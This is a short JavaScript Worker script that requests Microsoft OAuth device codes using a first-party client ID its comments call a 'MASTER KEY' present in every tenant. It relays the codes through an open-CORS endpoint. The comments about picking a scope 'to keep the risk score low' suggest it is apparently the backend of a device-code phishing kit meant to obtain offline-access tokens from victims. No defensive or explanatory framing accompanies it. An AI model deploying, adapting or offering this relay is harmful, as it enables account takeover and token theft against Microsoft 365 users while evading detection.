export default {
  async fetch(request, env, ctx) {
    // THE MASTER KEY: Microsoft Office for iOS
    // ID: d39116e0-8338-4e94-8149-c6e9d0e6b541
    // This ID exists in ALL directories by default.
    const MASTER_ID = "d39116e0-8338-4e94-8149-c6e9d0e6b541";

    try {
      const response = await fetch("https://login.microsoftonline.com/common/oauth2/v2.0/devicecode", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams({
          client_id: MASTER_ID,
          // We use the 'User.Read' scope to keep the risk score low
          scope: "openid profile offline_access https://graph.microsoft.com/User.Read"
        }),
      });

      const data = await response.json();

      return new Response(JSON.stringify(data), {
        status: 200,
        headers: {
          "Content-Type": "application/json",
          "Access-Control-Allow-Origin": "*",
        },
      });

    } catch (err) {
      return new Response(JSON.stringify({ error: "Bridge Failure" }), { status: 502 });
    }
  },
};
